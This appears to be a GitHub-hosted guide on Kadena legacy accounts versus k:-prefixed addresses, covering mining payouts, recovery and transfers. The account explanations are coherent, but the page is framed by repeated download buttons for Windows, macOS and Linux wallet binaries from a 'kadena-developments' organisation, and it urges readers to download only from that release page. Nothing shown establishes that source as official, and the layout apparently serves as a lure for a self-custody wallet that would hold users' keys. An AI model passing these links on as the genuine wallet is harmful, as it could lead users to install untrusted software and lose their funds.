![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Legacy Accounts and k: Addresses: Why Both Still Exist</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Two accounts can belong to the same key and hold different balances. One is named by a bare hexadecimal string, the other by the same string behind a `k:` prefix. Both are valid, both can receive, and mixing them up is one of the oldest sources of "my funds disappeared" reports on this network.

The distinction is a protocol detail with very practical consequences, which is why it survives years after the prefix became the default.

## You'll see this if

- A wallet shows you an address that does not start with `k:`.
- You mined to an address years ago and cannot find the balance now.
- A service rejects your address as invalid, or accepts one form and not the other.
- You restored an old phrase and got two different addresses from it.

## The same key, two names

An account on Kadena is a name plus a guard. The guard is the rule that authorises spending, and for a single-key account the name is derived from the public key.

That derivation has two historical forms:

| Form | Shape | Where it comes from |
| --- | --- | --- |
| Legacy | The bare public key, hexadecimal | Accounts created before the prefix convention |
| Prefixed | `k:` followed by the same hexadecimal | The current convention for single-key principals |

The prefix is a protocol tag meaning "single-key principal". It is not a network indicator, not a chain indicator and not a checksum. Its purpose is to make the account type readable at a glance, so a tool can tell a single-key account from a multi-key keyset (`w:`), a user guard (`u:`) or a reference keyset (`r:`).

Because both forms can exist for the same key, both can hold funds independently. They are two accounts, not two views of one.

## Where legacy names come from

Three origins account for almost every case in the wild.

**Accounts created before the convention existed.** Early wallets produced the bare form, and those accounts were never migrated because nothing required migration.

**Mining payouts.** Pool configurations accepted a public key, and a payout to the bare form landed in the legacy account even when the owner intended the prefixed one. This is the specific case behind the recurring "I mined to my wallet without the K" question.

**Tools that accept either form.** A service that validates loosely may derive one while the user expected the other, particularly when an address is pasted from an old note.

## Why a wallet shows one and not the other

A wallet displays the accounts it knows how to derive. Some derive the prefixed form by default and offer the legacy one as an option; others show both; a few show only what an import produced.

That is why restoring a phrase can produce an address that looks unfamiliar. The keys are the same; the naming convention being displayed is different, and the balance sits under whichever name was funded.

The test is not which form looks right. It is which form matches the address you used before, and which one an explorer shows a balance against.

## How to find out which one holds the funds

1. **List both forms** for the key: the bare hexadecimal and the same string with `k:` in front.
2. **Check each in an explorer**, on every chain you have used.
3. **Compare against any record you have**: an exchange withdrawal, a pool payout history, an old screenshot.
4. **Write down which form holds what**, because this is the note that prevents a repeat.

Neither form is deprecated. An account that exists stays usable, and the protocol does not retire names.

## Sending, and why the prefix is preferred

When you send to a prefixed account, the destination type is unambiguous: a single-key principal whose name must correspond to its guard. When you send to a bare string, tools have to infer that it is a legacy account, and inference is where mistakes enter.

Practical rules:

- **Prefer `k:` addresses when you have the choice.** They are self-describing.
- **Send to the exact form the recipient gave you.** Converting a legacy address into a prefixed one changes the account, and the funds will not appear where the recipient is looking.
- **Never "fix" an address by adding or removing a prefix** on the assumption that it is the same destination. It is the same key and a different account.

That last rule is the whole page in one line.

## The mining case, specifically

If a payout went to a bare public key, the funds are in the legacy account for that key. They are not lost and not on another chain, though they may also be on a chain your wallet is not displaying, which compounds the confusion.

To reach them, a wallet must be able to derive the legacy form for that key. Many can; some cannot, and that is a reason to check before choosing a wallet for old balances.

## What this means for recovery

A phrase restores keys, not names. If the accounts behind those keys were created under both conventions, a full recovery means finding both, not choosing one.

This is also why "the address does not match" is not the same as "the phrase is wrong". A mismatch may be a naming convention, a derivation path or a chain, and only after all three are exhausted does the phrase itself become the suspect.

## FAQ

**Is a legacy account still valid?**
Yes. It can receive, send and hold a balance exactly as before, and nothing in the network retires it.

**Can I convert a legacy account into a `k:` account?**
They are separate accounts. You can move funds between them with a transfer, which is a transaction rather than a rename.

**Why does my wallet show a `k:` address when I funded a bare one?**
Because it derives the prefixed form by default. The funded balance is under the other name, and the wallet needs to be able to display it.

**Does the prefix change the private key?**
No. The key is the same. The name is a different label for an account controlled by that key.

**Which form should I give to an exchange?**
Whatever the exchange asks for, in the form it specifies. A venue that expects `k:` will often reject the bare string, and one that expects the bare string may credit a different account than you intended.

## Related reading

- How to create a KDA account in Kadena Wallet
- Kadena mining in 2026: pools, payouts and where they land
- Why your KDA balance shows zero, and where it really is
- Importing a Chainweaver seed into Kadena Wallet

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Multisig Accounts in Kadena Wallet: w: Keysets Explained](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-multisig-account-in-wallet.md)
- [What Kadena Wallet Is, and What Self-Custody Actually Means](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/what-is-kadena-wallet-self-custody.md)
- [How to Create a KDA Account in Kadena Wallet](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/how-to-create-a-kda-account-in-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
